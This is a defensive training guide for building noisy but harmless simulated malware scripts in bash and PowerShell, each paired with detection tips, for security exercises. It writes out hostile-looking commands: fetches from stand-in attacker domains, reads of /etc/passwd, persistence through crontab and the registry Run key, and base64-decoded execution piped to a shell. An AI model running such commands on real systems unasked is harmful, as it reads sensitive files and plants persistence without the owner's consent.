# Creating harmless "malware" for training

**How to simulate malicious behaviour—without harm**

Learning to detect and respond to malware is essential. But we can’t safely use real malware in training—especially with vulnerable groups or on live systems. Instead, we can create safe, fake versions that act *just suspiciously enough* to trigger alerts, teach detection skills, and build confidence.

This guide walks you through building simple, non-destructive "malware" to test detection tools and teach response workflows. It behaves oddly enough to trip alarms, but never damages data or devices.

**Warning:** Don’t use this on systems with real users or outside your test environment. Always get permission if you’re training with others.

## What it simulates

You can simulate behaviours that are commonly flagged by threat detection tools:

* Suspicious network connections
* Unusual file access or copying
* Registry or system config changes
* Persistence (runs at startup)
* Scripts that encode or obfuscate

You’re *not* writing viruses or ransomware. Think of it as a roleplay actor in code: dramatic, noisy, but ultimately fake.

## Creating and running the scripts

To try these examples, use a test machine or virtual machine. On Linux or macOS, use a terminal. On Windows, run PowerShell as Administrator (right-click → “Run as Administrator”).

For each script:

1. **Copy the code into a plain text editor** (Notepad, VS Code, nano, etc.).
2. **Save the file** with an appropriate extension:

   * Linux/macOS: `script.sh`
   * Windows: `script.ps1`
3. **Make it executable (Linux/macOS only):**

   ```bash
   chmod +x script.sh
   ```
4. **Run the script:**

   * Linux/macOS: `./script.sh`
   * Windows: `powershell -ExecutionPolicy Bypass -File script.ps1`

You may need to adjust security settings to allow the script to run, especially on Windows.

## Basic script on Windows or Linux

This example creates a fake script that:

* Creates a suspicious file
* Pretends to contact a server
* Leaves obvious logs

```bash
#!/bin/bash

# FAKE MALWARE FOR TRAINING - NO HARM DONE
mkdir -p /tmp/fakeattack
cd /tmp/fakeattack
echo "Simulated exfiltration..." > data.txt
curl http://example.com/fakeendpoint >> /tmp/fakeattack/log.txt
cat /etc/passwd >> /tmp/fakeattack/log.txt 2>/dev/null
```

**Windows (PowerShell version):**

```powershell
# Harmless simulation
New-Item -ItemType Directory -Path C:\temp\fakeattack
Set-Location C:\temp\fakeattack
"Simulated malware behaviour" | Out-File payload.txt
Invoke-WebRequest -Uri http://example.com/fakeendpoint -OutFile netlog.txt
Get-Process | Out-File -Append netlog.txt
```

### How to detect it:

* Use endpoint security or SIEM to alert on outbound HTTP requests or access to sensitive files.
* Look for unexpected new directories like `/tmp/fakeattack` or `C:\temp\fakeattack`.
* Review process creation logs and file system write activity.

## Suspicious network connections

**Linux (bash):**

```bash
curl -s http://malicious.example.com/fakepayload -o /tmp/fetch.txt
ping -c 3 attacker.example.com >> /tmp/network.txt
```

**Windows (PowerShell):**

```powershell
Invoke-WebRequest -Uri http://malicious.example.com/fakepayload -OutFile C:\temp\fetch.txt
Test-NetConnection -ComputerName attacker.example.com -InformationLevel Detailed
```

**Detection tips:**

* Use network monitoring tools to catch suspicious domains.
* Watch for curl, Invoke-WebRequest, or Test-NetConnection in logs.
* Alert on uncommon DNS lookups or HTTP requests from endpoints.

## Unusual file access or copying

**Linux:**

```bash
cp /etc/passwd /tmp/copied_data.txt
find / -name "*.doc" > /tmp/suspicious_filelist.txt
```

**Windows:**

```powershell
Copy-Item -Path C:\Users\Public\Documents\*.docx -Destination C:\temp\snoop\ -Recurse
Get-ChildItem -Path C:\ -Recurse -Include *.pdf | Out-File C:\temp\pdf_log.txt
```

**Detection tips:**

* Watch for high-volume file access or listing operations.
* Flag access to `/etc/passwd`, `*.pdf`, or `*.docx` in odd locations.
* Alert on use of `find`, `Copy-Item`, and `Get-ChildItem` at scale.

## Registry or system config changes (Windows only)

```powershell
New-Item -Path "HKCU:\Software\FakeMalware" -Force
Set-ItemProperty -Path "HKCU:\Software\FakeMalware" -Name "Trigger" -Value "Suspicious"
```

**Detection tips:**

* Monitor registry modification events.
* Flag creation of new keys in non-standard locations.
* Use Sysmon or Defender ATP to watch for registry write activity.

## Persistence (run at startup)

**Linux (crontab):**

```bash
echo "@reboot /tmp/fakeattack/startup.sh" >> /var/spool/cron/crontabs/$(whoami)
```

**Windows (registry autorun):**

```powershell
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "FakeStartup" -Value "C:\temp\fakeattack\payload.bat"
```

**Detection tips:**

* Search for new startup entries in crontabs or registry.
* Use audit logs or SIEM alerts on changes to startup scripts.
* Flag use of `@reboot`, `Run` registry key, or auto-launched scripts.

## Scripts that encode or obfuscate

**Linux (base64 encoded script):**

```bash
SCRIPT="echo Hello; curl http://example.com"
echo "$SCRIPT" | base64 > /tmp/obfuscated.txt
base64 -d /tmp/obfuscated.txt | bash
```

**Windows (PowerShell encoded command):**

```powershell
$cmd = "Write-Output 'Hello'; Invoke-WebRequest -Uri http://example.com"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$encodedCommand = [Convert]::ToBase64String($bytes)
powershell.exe -EncodedCommand $encodedCommand
```

**Detection tips:**

* Alert on use of `base64`, `EncodedCommand`, or decoding followed by execution.
* Check for scripts reading from and writing to `.txt` with encoded content.
* Flag use of PowerShell with unusual arguments.

## Making it noisier (on purpose, tbd)

Want it to feel more like real malware?

* Encode the script with base64
* Add an autorun/persistence method
* Simulate keylogging by writing fake keystrokes to a file
* Copy itself to different folders
* Drop a benign executable with a suspicious name

**Keep it safe:**

* No privilege escalation
* No actual file deletion or encryption
* No user data touched

## How to detect it

Use your existing IPA-SIEM tools or detection stack:

* Wazuh rules will catch odd curl requests or new folders in `/tmp`
* Endpoint detection may flag new scheduled tasks or PowerShell scripts
* Log alerts should include process creation, file writes, and DNS lookups

Ask participants to:

* Watch the alerts appear in the dashboard
* Investigate the behaviour
* Discuss whether it looks like real malware, or a false positive

## How to safely remove it

At the end of the training, clean up with simple commands:

```bash
rm -rf /tmp/fakeattack
```

```powershell
Remove-Item -Recurse -Force C:\temp\fakeattack
```
Or use a script that wipes all changes the fake malware made. Explain how to:

* Check logs to confirm it’s gone
* Re-scan to ensure the system is clean
* Document the incident for training records

## Facilitator notes

* Always run these exercises in **virtual machines** or isolated lab environments.
* Don’t simulate malware using real user data or on production networks.
* Be transparent: this is not a trick, it’s a *controlled experience*.
* Let participants feel the tension of detection—then show the relief of clean-up.

Training with fake malware builds muscle memory. Participants learn what to watch for, how to respond, and how to stay 
calm under pressure. It also reduces the fear factor around real incidents.

Knowledge is power. Even if the malware is fake, the skills it builds are very real.

You're not hacking—you're rehearsing. That’s what good defence looks like.
